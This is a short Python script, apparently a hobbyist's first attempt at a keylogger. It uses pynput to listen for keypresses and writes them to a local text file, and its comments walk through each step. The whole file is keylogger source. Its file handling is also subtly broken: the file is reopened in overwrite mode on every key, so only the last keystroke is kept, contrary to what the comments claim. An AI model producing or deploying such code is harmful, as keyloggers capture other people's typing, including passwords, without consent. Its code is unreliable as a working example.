# Attempt at keylogger. Need the following steps in order to make it function:
# Find a way to measure key strokes and save input (Steps 1/2)
# Find a way to create a text file for storing the input, and find a way to write the input to the text file (Steps 3/4)

# Import proper libraries. This is for step 1-importing keyboard/mouse allows me to "listen" to the keystrokes 
from pynput.keyboard import Listener

def record_keystroke(key):
    key = str(key)

    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r' or key == 'Key.shift_l':
        key = ''
#Lines 8-16 are going to be focused on Steps 1/2. The function 'record_keystroke' takes the keyboard input and converts it to a string for simplicty sake.
#Lines 11-16 deal with the enter, space, and shift keys. 

    with open('storedtext.txt', 'w') as f:
        f.write(key)
# Lines 20 and 21 create a file called 'storedtext' and gives us 'write' access. We will be writing the key input to this file.

with Listener(on_press=record_keystroke) as x:
    x.join()
